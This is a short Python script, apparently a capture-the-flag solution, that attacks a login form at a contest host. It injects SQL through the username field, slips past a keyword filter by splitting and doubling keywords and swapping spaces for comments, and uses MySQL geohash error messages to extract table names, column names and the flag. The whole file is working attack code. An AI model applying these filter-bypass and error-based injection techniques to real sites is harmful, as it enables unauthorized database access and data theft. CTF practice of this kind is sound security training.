import requests
import html
import re

url = 'http://h4ck3r.quest:10006/login'

waf = 'union|select|where|and|or'.split('|')
def bypass(query):
    for w in waf:
        h = len(w)//2
        query = query.replace(w, w[:h]+w+w[h:])
    query = query.replace(' ', '/**/')
    return query

def req(query):
    payload = f"\\' {query} #"
    payload = bypass(payload)
    r = requests.post(url, data={ 'username': payload, 'password': '' })
    r = html.unescape(r.text)
    if 0 and 'Mysql2::Error' in r:
        for l in r.split('\n'):
            if 'Mysql2::Error' in l:
                print(query, l)
    return r

def error(column, table, where = ''):
    regex = "Incorrect geohash value: '(.*)'"
    payload = f'union select 1,2,ST_LatFromGeoHash(c) from (select {column} as c from {table} {where}) as T'
    r = req(payload)
    r = re.findall(regex, r)[0]
    return r

if __name__ == '__main__':
    table_name = error('table_name', 'information_schema.tables')
    print(table_name)

    where = 'where table_name in (char({}))'.format(','.join(str(ord(c)) for c in table_name))
    column_name = error('column_name', 'information_schema.columns', where)
    print(column_name)

    flag = error(column_name, f'`{table_name}`')
    print(flag)
